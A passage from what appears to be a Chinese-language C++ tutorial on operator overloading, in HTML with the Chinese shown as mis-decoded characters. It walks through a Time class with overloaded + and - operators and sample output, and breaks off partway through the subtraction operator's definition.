class="keyword">const</span> &#123;</span><br><span class="line">    MyClass result;</span><br><span class="line">    <span class="comment">// å®ç°åŠ æ³•é€»è¾‘ï¼Œé€šå¸¸æ¶‰åŠ this å¯¹è±¡å’Œ other å¯¹è±¡</span></span><br><span class="line">    <span class="comment">// result.data = this-&gt;data + other.data; // å‡è®¾æœ‰ data æˆå‘˜</span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨</span></span><br><span class="line">MyClass obj1, obj2;</span><br><span class="line">MyClass sum = obj1 + obj2; <span class="comment">// å®é™…è°ƒç”¨ obj1.operator+(obj2)</span></span><br></pre></td></tr></table></figure><p><strong>ä½œä¸ºéæˆå‘˜å‡½æ•° (é€šå¸¸æ˜¯å‹å…ƒ):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... ç§æœ‰æˆå‘˜ ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... å…¶ä»–å…¬æœ‰æˆå‘˜ ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å£°æ˜å‹å…ƒå‡½æ•°æ¥é‡è½½ + è¿ç®—ç¬¦</span></span><br><span class="line">    <span class="keyword">friend</span> MyClass <span class="keyword">operator</span>+(<span class="keyword">const</span> MyClass&amp; left, <span class="keyword">const</span> MyClass&amp; right);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰ (éæˆå‘˜å‡½æ•°ï¼Œä¸éœ€è¦ MyClass::)</span></span><br><span class="line">MyClass <span class="keyword">operator</span>+(<span class="keyword">const</span> MyClass&amp; left, <span class="keyword">const</span> MyClass&amp; right) &#123;</span><br><span class="line">    MyClass result;</span><br><span class="line">    <span class="comment">// å®ç°åŠ æ³•é€»è¾‘ï¼Œè®¿é—® left å’Œ right å¯¹è±¡çš„æˆå‘˜ (éœ€è¦å‹å…ƒæƒé™è®¿é—®ç§æœ‰æˆå‘˜)</span></span><br><span class="line">    <span class="comment">// result.data = left.data + right.data; // å‡è®¾æœ‰ data æˆå‘˜</span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨</span></span><br><span class="line">MyClass obj1, obj2;</span><br><span class="line">MyClass sum = obj1 + obj2; <span class="comment">// å®é™…è°ƒç”¨ operator+(obj1, obj2)</span></span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„äº‹é¡¹:</strong></p><ul><li>  <strong>ä¸èƒ½åˆ›å»ºæ–°çš„è¿ç®—ç¬¦:</strong> ä½ åªèƒ½é‡è½½ C++ ä¸­å·²æœ‰çš„è¿ç®—ç¬¦ï¼Œä¸èƒ½å‘æ˜æ–°çš„è¿ç®—ç¬¦ï¼ˆæ¯”å¦‚ <code>**</code> æˆ– <code>##</code>ï¼‰ã€‚</li><li>  <strong>ä¸èƒ½æ”¹å˜è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§æˆ–ç»“åˆæ€§:</strong> é‡è½½ <code>+</code> å’Œ <code>*</code> åï¼Œ<code>*</code> çš„ä¼˜å…ˆçº§ä»ç„¶é«˜äº <code>+</code>ã€‚</li><li>  <strong>ä¸èƒ½æ”¹å˜è¿ç®—ç¬¦çš„æ“ä½œæ•°ä¸ªæ•°:</strong> ä¸èƒ½å°†äºŒå…ƒè¿ç®—ç¬¦é‡è½½ä¸ºä¸€å…ƒè¿ç®—ç¬¦ï¼Œåä¹‹äº¦ç„¶ã€‚</li><li>  <strong>è‡³å°‘ä¸€ä¸ªæ“ä½œæ•°æ˜¯ç”¨æˆ·å®šä¹‰ç±»å‹:</strong> ä¸èƒ½ä¸ºä¸¤ä¸ªå†…ç½®ç±»å‹ï¼ˆå¦‚ <code>int</code> å’Œ <code>int</code>ï¼‰é‡è½½è¿ç®—ç¬¦ã€‚è¿ç®—ç¬¦é‡è½½å¿…é¡»æ¶‰åŠè‡³å°‘ä¸€ä¸ªç±»å¯¹è±¡ï¼ˆæˆ–æšä¸¾ç±»å‹ï¼‰ã€‚</li><li><strong>æŸäº›è¿ç®—ç¬¦ä¸èƒ½é‡è½½:</strong><ul><li>  <code>.</code> (æˆå‘˜è®¿é—®è¿ç®—ç¬¦)</li><li>  <code>.*</code> (æˆå‘˜æŒ‡é’ˆè®¿é—®è¿ç®—ç¬¦)</li><li>  <code>::</code> (ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦)</li><li>  <code>sizeof</code> (å¤§å°è¿ç®—ç¬¦)</li><li>  <code>?:</code> (æ¡ä»¶è¿ç®—ç¬¦)</li><li>  <code>typeid</code> (è¿è¡Œæ—¶ç±»å‹è¯†åˆ«è¿ç®—ç¬¦)</li><li>  <code>static_cast</code>, <code>dynamic_cast</code>, <code>const_cast</code>, <code>reinterpret_cast</code> (ç±»å‹è½¬æ¢è¿ç®—ç¬¦ï¼Œè™½ç„¶ <code>operator type()</code> å½¢å¼çš„è½¬æ¢å‡½æ•°å¯ä»¥å®šä¹‰)</li></ul></li></ul><p>è¿ç®—ç¬¦é‡è½½æ˜¯ C++ æä¾›çš„ä¸€ä¸ªå¼ºå¤§å·¥å…·ï¼Œå¯ä»¥ä½¿è‡ªå®šä¹‰ç±»çš„ä½¿ç”¨æ›´åŠ è‡ªç„¶å’Œæ–¹ä¾¿ã€‚ç„¶è€Œï¼Œä¹Ÿåº”è°¨æ…ä½¿ç”¨ï¼Œé¿å…è¿‡åº¦æˆ–ä¸ç›´è§‚çš„é‡è½½ï¼Œä»¥å…é™ä½ä»£ç çš„å¯è¯»æ€§ã€‚æ¥ä¸‹æ¥çš„ç« èŠ‚å°†é€šè¿‡å…·ä½“çš„ä¾‹å­æ¥æ¼”ç¤ºå¦‚ä½•é‡è½½ä¸åŒçš„è¿ç®—ç¬¦ã€‚</p><h2 id="11-2-è®¡ç®—æ—¶é—´ï¼šä¸€ä¸ªè¿ç®—ç¬¦é‡è½½ç¤ºä¾‹"><a href="#11-2-è®¡ç®—æ—¶é—´ï¼šä¸€ä¸ªè¿ç®—ç¬¦é‡è½½ç¤ºä¾‹" class="headerlink" title="11.2 è®¡ç®—æ—¶é—´ï¼šä¸€ä¸ªè¿ç®—ç¬¦é‡è½½ç¤ºä¾‹"></a>11.2 è®¡ç®—æ—¶é—´ï¼šä¸€ä¸ªè¿ç®—ç¬¦é‡è½½ç¤ºä¾‹</h2><p>ä¸ºäº†å…·ä½“è¯´æ˜è¿ç®—ç¬¦é‡è½½çš„è¿‡ç¨‹å’Œç”¨æ³•ï¼Œè®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç®€å•çš„ <code>Time</code> ç±»æ¥è¡¨ç¤ºæ—¶é—´ï¼ˆå°æ—¶å’Œåˆ†é’Ÿï¼‰ï¼Œå¹¶ä¸ºå…¶é‡è½½ä¸€äº›è¿ç®—ç¬¦ã€‚</p><p><strong>åŸºç¡€ <code>Time</code> ç±»:</strong></p><p>é¦–å…ˆï¼Œæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªåŸºç¡€çš„ <code>Time</code> ç±»ï¼ŒåŒ…å«å°æ—¶å’Œåˆ†é’Ÿï¼Œä¸€ä¸ªæ„é€ å‡½æ•°æ¥åˆå§‹åŒ–æ—¶é—´ï¼Œä»¥åŠä¸€ä¸ª <code>show()</code> æ–¹æ³•æ¥æ˜¾ç¤ºæ—¶é—´ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// time.h -- Time ç±»å®šä¹‰</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> TIME_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TIME_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Time</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> hours;</span><br><span class="line">    <span class="keyword">int</span> minutes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// æ„é€ å‡½æ•°ï¼Œé»˜è®¤å€¼ä¸º 0 æ—¶ 0 åˆ†</span></span><br><span class="line">    Time(<span class="keyword">int</span> h = <span class="number">0</span>, <span class="keyword">int</span> m = <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// æ·»åŠ åˆ†é’Ÿæ•°çš„æ–¹æ³• (å†…éƒ¨ä¼šå¤„ç†è¿›ä½)</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">AddMin</span><span class="params">(<span class="keyword">int</span> m)</span></span>;</span><br><span class="line">    <span class="comment">// æ·»åŠ å°æ—¶æ•°çš„æ–¹æ³•</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">AddHr</span><span class="params">(<span class="keyword">int</span> h)</span></span>;</span><br><span class="line">    <span class="comment">// é‡ç½®æ—¶é—´ä¸º 0 æ—¶ 0 åˆ†</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Reset</span><span class="params">(<span class="keyword">int</span> h = <span class="number">0</span>, <span class="keyword">int</span> m = <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="comment">// æ˜¾ç¤ºæ—¶é—´</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Show</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// TIME_H_</span></span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// time.cpp -- Time ç±»æ–¹æ³•å®ç°</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;time.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">Time::Time(<span class="keyword">int</span> h, <span class="keyword">int</span> m) &#123;</span><br><span class="line">    hours = h;</span><br><span class="line">    minutes = m;</span><br><span class="line">    <span class="comment">// å¯ä»¥æ·»åŠ ä¸€äº›éªŒè¯é€»è¾‘ï¼Œä¾‹å¦‚ç¡®ä¿åˆ†é’Ÿæ•°å°äº60</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Time::AddMin</span><span class="params">(<span class="keyword">int</span> m)</span> </span>&#123;</span><br><span class="line">    minutes += m;</span><br><span class="line">    hours += minutes / <span class="number">60</span>; <span class="comment">// æ•´æ•°é™¤æ³•ï¼Œè®¡ç®—å¢åŠ çš„å°æ—¶æ•°</span></span><br><span class="line">    minutes %= <span class="number">60</span>;       <span class="comment">// å–æ¨¡ï¼Œå¾—åˆ°å‰©ä½™çš„åˆ†é’Ÿæ•°</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Time::AddHr</span><span class="params">(<span class="keyword">int</span> h)</span> </span>&#123;</span><br><span class="line">    hours += h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Time::Reset</span><span class="params">(<span class="keyword">int</span> h, <span class="keyword">int</span> m)</span> </span>&#123;</span><br><span class="line">    hours = h;</span><br><span class="line">    minutes = m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Time::Show</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; hours &lt;&lt; <span class="string">&quot; hours, &quot;</span> &lt;&lt; minutes &lt;&lt; <span class="string">&quot; minutes&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªåŸºç¡€ç±»å…è®¸æˆ‘ä»¬åˆ›å»º <code>Time</code> å¯¹è±¡å¹¶å¯¹å…¶è¿›è¡Œä¸€äº›åŸºæœ¬æ“ä½œï¼Œä½†è¿˜ä¸èƒ½ç›´æ¥ä½¿ç”¨ <code>+</code> ç­‰è¿ç®—ç¬¦ã€‚</p><h3 id="11-2-1-æ·»åŠ åŠ æ³•è¿ç®—ç¬¦"><a href="#11-2-1-æ·»åŠ åŠ æ³•è¿ç®—ç¬¦" class="headerlink" title="11.2.1 æ·»åŠ åŠ æ³•è¿ç®—ç¬¦"></a>11.2.1 æ·»åŠ åŠ æ³•è¿ç®—ç¬¦</h3><p>æˆ‘ä»¬å¸Œæœ›èƒ½å¤Ÿåƒ <code>total = time1 + time2;</code> è¿™æ ·å°†ä¸¤ä¸ª <code>Time</code> å¯¹è±¡ç›¸åŠ ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦é‡è½½ <code>+</code> è¿ç®—ç¬¦ã€‚æˆ‘ä»¬å°†å®ƒå®ç°ä¸º <code>Time</code> ç±»çš„<strong>æˆå‘˜å‡½æ•°</strong>ã€‚</p><p><strong>åœ¨ <code>time.h</code> ä¸­æ·»åŠ å£°æ˜:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\time.h</span></span><br><span class="line"><span class="comment">// ... (åŒ…å« guards å’Œ iostream) ...</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Time</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> hours;</span><br><span class="line">    <span class="keyword">int</span> minutes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Time(<span class="keyword">int</span> h = <span class="number">0</span>, <span class="keyword">int</span> m = <span class="number">0</span>);</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">AddMin</span><span class="params">(<span class="keyword">int</span> m)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">AddHr</span><span class="params">(<span class="keyword">int</span> h)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Reset</span><span class="params">(<span class="keyword">int</span> h = <span class="number">0</span>, <span class="keyword">int</span> m = <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Show</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é‡è½½åŠ æ³•è¿ç®—ç¬¦ (+) ä½œä¸ºæˆå‘˜å‡½æ•°</span></span><br><span class="line">    <span class="comment">// å‚æ•° t ä»£è¡¨åŠ å·å³è¾¹çš„ Time å¯¹è±¡</span></span><br><span class="line">    <span class="comment">// const å…³é”®å­—è¡¨ç¤ºè¿™ä¸ªå‡½æ•°ä¸ä¼šä¿®æ”¹è°ƒç”¨å®ƒçš„å¯¹è±¡ (åŠ å·å·¦è¾¹çš„å¯¹è±¡)</span></span><br><span class="line">    <span class="comment">// è¿”å›ä¸€ä¸ªæ–°çš„ Time å¯¹è±¡ä½œä¸ºç»“æœ</span></span><br><span class="line">    Time <span class="keyword">operator</span>+(<span class="keyword">const</span> Time &amp; t) <span class="keyword">const</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... (endif) ...</span></span><br></pre></td></tr></table></figure><p><strong>åœ¨ <code>time.cpp</code> ä¸­æ·»åŠ å®šä¹‰:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\time.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;time.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ... (æ„é€ å‡½æ•°å’Œå…¶ä»–æ–¹æ³•çš„å®šä¹‰) ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰é‡è½½çš„åŠ æ³•è¿ç®—ç¬¦</span></span><br><span class="line">Time Time::<span class="keyword">operator</span>+(<span class="keyword">const</span> Time &amp; t) <span class="keyword">const</span> &#123;</span><br><span class="line">    Time sum; <span class="comment">// åˆ›å»ºä¸€ä¸ªä¸´æ—¶çš„ Time å¯¹è±¡æ¥å­˜å‚¨ç»“æœ</span></span><br><span class="line">    sum.minutes = minutes + t.minutes; <span class="comment">// å°†ä¸¤ä¸ªå¯¹è±¡çš„åˆ†é’Ÿæ•°ç›¸åŠ </span></span><br><span class="line">    sum.hours = hours + t.hours + sum.minutes / <span class="number">60</span>; <span class="comment">// å°†å°æ—¶æ•°ç›¸åŠ ï¼Œå¹¶åŠ ä¸Šåˆ†é’Ÿè¿›ä½çš„å°æ—¶</span></span><br><span class="line">    sum.minutes %= <span class="number">60</span>; <span class="comment">// è°ƒæ•´ç»“æœçš„åˆ†é’Ÿæ•°</span></span><br><span class="line">    <span class="keyword">return</span> sum; <span class="comment">// è¿”å›ç»“æœå¯¹è±¡</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨é‡è½½çš„ <code>+</code> è¿ç®—ç¬¦:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.cpp -- ä½¿ç”¨ Time ç±»å’Œé‡è½½çš„ +</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;time.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">Time <span class="title">planning</span><span class="params">(<span class="number">2</span>, <span class="number">40</span>)</span></span>; <span class="comment">// 2 å°æ—¶ 40 åˆ†é’Ÿ</span></span><br><span class="line">    <span class="function">Time <span class="title">coding</span><span class="params">(<span class="number">5</span>, <span class="number">55</span>)</span></span>;   <span class="comment">// 5 å°æ—¶ 55 åˆ†é’Ÿ</span></span><br><span class="line">    <span class="function">Time <span class="title">fixing</span><span class="params">(<span class="number">1</span>, <span class="number">30</span>)</span></span>;   <span class="comment">// 1 å°æ—¶ 30 åˆ†é’Ÿ</span></span><br><span class="line">    Time total;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Planning time = &quot;</span>;</span><br><span class="line">    planning.Show();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Coding time = &quot;</span>;</span><br><span class="line">    coding.Show();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨é‡è½½çš„ + è¿ç®—ç¬¦</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Calculating total time...\n&quot;</span>;</span><br><span class="line">    total = planning + coding + fixing; <span class="comment">// ç›¸å½“äº (planning.operator+(coding)).operator+(fixing)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ˜¾ç¤ºæ€»æ—¶é—´</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Total time = &quot;</span>;</span><br><span class="line">    total.Show();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç¼–è¯‘å’Œè¿è¡Œ:</strong><br>(éœ€è¦å°† <code>main.cpp</code> å’Œ <code>time.cpp</code> ä¸€èµ·ç¼–è¯‘é“¾æ¥)</p><p><strong>è¾“å‡º:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Planning time &#x3D; 2 hours, 40 minutes</span><br><span class="line">Coding time &#x3D; 5 hours, 55 minutes</span><br><span class="line">Calculating total time...</span><br><span class="line">Total time &#x3D; 10 hours, 5 minutes</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œé€šè¿‡é‡è½½ <code>+</code> è¿ç®—ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨éå¸¸è‡ªç„¶çš„æ–¹å¼å°† <code>Time</code> å¯¹è±¡ç›¸åŠ ã€‚</p><h3 id="11-2-2-é‡è½½é™åˆ¶"><a href="#11-2-2-é‡è½½é™åˆ¶" class="headerlink" title="11.2.2 é‡è½½é™åˆ¶"></a>11.2.2 é‡è½½é™åˆ¶</h3><p>é‡è½½è¿ç®—ç¬¦æ—¶å¿…é¡»éµå®ˆä¸€äº›è§„åˆ™å’Œé™åˆ¶ï¼š</p><ol><li> <strong>ä¸èƒ½åˆ›å»ºæ–°è¿ç®—ç¬¦:</strong> åªèƒ½é‡è½½ C++ å·²æœ‰çš„è¿ç®—ç¬¦ã€‚</li><li> <strong>ä¸èƒ½æ”¹å˜è¿ç®—ç¬¦ä¼˜å…ˆçº§å’Œç»“åˆæ€§:</strong> <code>*</code> æ€»æ˜¯ä¼˜å…ˆäº <code>+</code>ã€‚</li><li> <strong>ä¸èƒ½æ”¹å˜è¿ç®—ç¬¦æ“ä½œæ•°ä¸ªæ•°:</strong> äºŒå…ƒè¿ç®—ç¬¦ï¼ˆå¦‚ <code>+</code>ï¼‰å¿…é¡»æ¥å—ä¸¤ä¸ªæ“ä½œæ•°ï¼Œä¸€å…ƒè¿ç®—ç¬¦ï¼ˆå¦‚ <code>-</code> (è´Ÿå·)ï¼‰å¿…é¡»æ¥å—ä¸€ä¸ªæ“ä½œæ•°ã€‚</li><li> <strong>è‡³å°‘ä¸€ä¸ªæ“ä½œæ•°æ˜¯ç”¨æˆ·å®šä¹‰ç±»å‹:</strong> ä¸èƒ½ä¸ºä¸¤ä¸ª <code>int</code> é‡è½½ <code>+</code> è¿ç®—ç¬¦ã€‚é‡è½½å¿…é¡»æ¶‰åŠè‡³å°‘ä¸€ä¸ªç±»å¯¹è±¡ï¼ˆæˆ–æšä¸¾ï¼‰ã€‚</li><li> <strong>ç‰¹å®šè¿ç®—ç¬¦ä¸èƒ½é‡è½½:</strong> å¦‚ <code>.</code>ã€<code>::</code>ã€<code>sizeof</code>ã€<code>?:</code> ç­‰ã€‚</li><li> <strong>ä¿æŒç›´è§‚æ€§:</strong> é‡è½½åº”è¯¥ç¬¦åˆè¿ç®—ç¬¦çš„é€šå¸¸å«ä¹‰ã€‚ä¾‹å¦‚ï¼Œç”¨ <code>+</code> æ¥è¡¨ç¤ºä¸¤ä¸ªå¯¹è±¡çš„ç›¸å‡ä¼šéå¸¸ä»¤äººå›°æƒ‘ã€‚è™½ç„¶è¯­æ³•ä¸Šå…è®¸ï¼Œä½†è¿™æ˜¯ä¸è‰¯å®è·µã€‚</li></ol><h3 id="11-2-3-å…¶ä»–é‡è½½è¿ç®—ç¬¦"><a href="#11-2-3-å…¶ä»–é‡è½½è¿ç®—ç¬¦" class="headerlink" title="11.2.3 å…¶ä»–é‡è½½è¿ç®—ç¬¦"></a>11.2.3 å…¶ä»–é‡è½½è¿ç®—ç¬¦</h3><p>æˆ‘ä»¬å¯ä»¥ä¸º <code>Time</code> ç±»é‡è½½æ›´å¤šçš„è¿ç®—ç¬¦ï¼Œä½¿å…¶åŠŸèƒ½æ›´å®Œå–„ã€‚</p><p><strong>é‡è½½å‡æ³•è¿ç®—ç¬¦ (<code>-</code>) ä½œä¸ºæˆå‘˜å‡½æ•°:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\time.h</span></span><br><span class="line"><span class="comment">// ... existing code ...</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Time</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... existing members ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... existing methods ...</span></span><br><span class="line">    Time <span class="keyword">operator</span>+(<span class="keyword">const</span> Time &amp; t) <span class="keyword">const</span>;</span><br><span class="line">    <span class="comment">// å£°æ˜é‡è½½å‡æ³•è¿ç®—ç¬¦ (-)</span></span><br><span class="line">    Time <span class="keyword">operator</span>-(<span class="keyword">const</span> Time &amp; t) <span class="keyword">const</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// ... existing code ...</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\time.cpp</span></span><br><span class="line"><span class="comment">// ... existing code ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰é‡è½½çš„å‡æ³•è¿ç®—ç¬¦</span></span><br><span class="line">Time Time::<span class="keyword">operator</span>-(<span class="keyword">const</span> Time &amp; t) <span class="keyword">const</span> &#123;</span><br><span class="line">    Time diff;</span><br><span class="line">    <span class="keyword">int</span> tot1, tot2;</span><br><span class="line">    